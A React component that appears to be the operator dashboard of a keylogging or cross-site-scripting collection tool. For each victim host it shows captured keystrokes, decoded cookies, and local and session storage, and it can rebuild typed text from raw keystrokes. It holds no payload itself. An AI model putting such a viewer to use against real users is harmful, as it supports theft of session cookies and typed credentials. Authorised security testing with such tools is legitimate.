import React, { useCallback, useMemo, useState } from 'react';

import { MdCookie, MdKeyboard, MdStorage } from 'react-icons/md';
import { InfoIcon } from '@chakra-ui/icons';

import {
  Box,
  Button,
  Checkbox,
  Code,
  FormControl,
  Heading,
  Icon,
  Modal,
  ModalBody,
  ModalContent,
  ModalFooter,
  ModalHeader,
  ModalOverlay,
  Tab,
  Table,
  Tabs,
  TableContainer,
  TabList,
  TabPanel,
  TabPanels,
  Tbody,
  Td,
  Text,
  Th,
  Thead,
  Tooltip,
  Tr,
  useColorModeValue,
} from '@chakra-ui/react';
import moment from 'moment-timezone';

import { parseKeystrokes } from '../helpers';

const PROCESS_KEYS_INFO = `This will remove control, function, and navigation keys, and replace [ENTER] with a newline and delete a character for each [BACKSPACE].`;

const displayStorage = storage => (
  <TableContainer>
    <Table variant='simple'>
      <Thead>
        <Tr>
          <Th>Key</Th>
          <Th>Value</Th>
        </Tr>
      </Thead>
      <Tbody>
        {Object.entries(JSON.parse(atob(storage))).map(([key, value]) => (
          <Tr>
            <Td>{key}</Td>
            <Td>{value}</Td>
          </Tr>
        ))}
      </Tbody>
    </Table>
  </TableContainer>
);

const LogModal = ({ selectedLog, setShowDetails, showDetails }) => {
  const logsModalTextBg = useColorModeValue('gray.200', 'gray.600');

  const [processKeys, setProcessKeys] = useState(false);

  const toggleProcessKeys = useCallback(
    () => setProcessKeys(!processKeys),
    [processKeys, setProcessKeys],
  );

  const processedKeys = useMemo(
    () => selectedLog?.keystrokes && parseKeystrokes(selectedLog?.keystrokes, processKeys),
    [selectedLog, processKeys],
  );

  return (
    <Modal
      blockScrollOnMount={false}
      isCentered
      isOpen={showDetails}
      onClose={() => setShowDetails(null)}
    >
      <ModalOverlay />
      <ModalContent height='600px' maxWidth='800px'>
        <ModalHeader>
          {selectedLog.host} - {moment(selectedLog.created_at).format('MMM DD, YYYY hh:mm a')}
        </ModalHeader>
        <ModalBody overflowY='scroll'>
          <Tabs variant='soft-rounded' colorScheme='green'>
            <TabList>
              <Tab>
                Keystrokes &nbsp;
                <Icon as={MdKeyboard} />
              </Tab>
              {selectedLog.cookies && (
                <Tab>
                  Cookies &nbsp;
                  <Icon as={MdCookie} />
                </Tab>
              )}
              {selectedLog.local_storage && (
                <Tab>
                  Local Storage &nbsp;
                  <Icon as={MdStorage} />
                </Tab>
              )}
              {selectedLog.session_storage && (
                <Tab>
                  Session Storage &nbsp;
                  <Icon as={MdStorage} />
                </Tab>
              )}
            </TabList>
            <TabPanels>
              <TabPanel>
                <FormControl mb='5'>
                  <Checkbox onChange={toggleProcessKeys}>Process keystrokes</Checkbox>
                  <Tooltip label={PROCESS_KEYS_INFO}>
                    <InfoIcon ml='2' />
                  </Tooltip>
                </FormControl>
                <Box borderRadius='md' bg={logsModalTextBg} p='10px'>
                  <Text mb='1rem' style={{ whiteSpace: 'pre-line' }}>
                    {processedKeys}
                  </Text>
                </Box>
              </TabPanel>
              {selectedLog.cookies && (
                <TabPanel>
                  <Box borderRadius='md' bg={logsModalTextBg} p='10px'>
                    <Text mb='1rem' style={{ whiteSpace: 'pre-line' }}>
                      {atob(selectedLog.cookies)}
                    </Text>
                  </Box>
                </TabPanel>
              )}
              {selectedLog.local_storage && (
                <TabPanel>
                  {selectedLog.local_storage && (
                    <Box>
                      <Heading as='h4' mb='3' size='md'>
                        Local Storage
                      </Heading>
                      <Box borderRadius='md' bg={logsModalTextBg} p='10px'>
                        {displayStorage(selectedLog.local_storage)}
                      </Box>
                    </Box>
                  )}
                </TabPanel>
              )}
              {selectedLog.session_storage && (
                <TabPanel>
                  {selectedLog.session_storage && (
                    <Box>
                      <Heading as='h4' mb='3' size='md'>
                        Session Storage
                      </Heading>
                      <Box borderRadius='md' bg={logsModalTextBg} p='10px'>
                        {displayStorage(selectedLog.session_storage)}
                      </Box>
                    </Box>
                  )}
                </TabPanel>
              )}
            </TabPanels>
          </Tabs>
        </ModalBody>
        <ModalFooter>
          <Button colorScheme='blue' mr={3} onClick={() => setShowDetails(null)}>
            Close
          </Button>
        </ModalFooter>
      </ModalContent>
    </Modal>
  );
};

export default LogModal;
